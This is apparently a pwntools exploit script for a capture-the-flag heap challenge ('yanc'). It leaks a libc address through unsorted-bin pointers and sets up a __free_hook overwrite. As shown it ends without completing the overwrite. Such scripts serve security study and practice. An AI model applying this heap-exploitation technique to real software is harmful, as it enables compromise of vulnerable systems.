#!/usr/bin/env python3
from pwn import *
from sys import argv
binary = ELF('yanc', checksec=0)
libc = ELF('libc.so.6', checksec=0)
if len(argv) >= 2 and argv[1] == '-r':
  p = remote('pwn.chal.ctf.gdgalgiers.com', 1406)
else:
  p = binary.process(env={})

def option(*args):
  p.recvuntil(b'Choice')
  for i in args:
    s(str(i).encode(), b':')

s = lambda x, r="" : \
  p.sendafter(r, x) if r else p.send(x)

one_gadget = 0xe6c7e
pause()

# fill tcache and insert into unsortedbin
for i in range(0, 9, 1):
  log.info('Add note #%d'%i)
  option(1, i, 208, 'a', 'a')

# unset used flag for each entry
for i in range(0, 9, 1):
  log.info('Delete note #%d'%i)
  option(4, i)

# reallocate without overwriting information to allow for show_note
for i in range(0, 9, 1):
  log.info('Add note #%d'%i)
  option(1, i, 208, 'a', 'a')

# show chunk 7
option(2, 7)

# leak unsorted bin fd/bk pointer
p.recvuntil(b'Title: ')
libc.address = int.from_bytes(p.recvline().strip(b'\n'), 'little')-0x1ebb61
log.info("Leaked base address of libc: %#lx"%libc.address)
log.info("__free_hook: %#lx"%libc.sym['__free_hook'])

# get ptr to __free_hook
option(3, 7)
s(p64(libc.sym['__free_hook']), b'Title: ')

p.interactive()

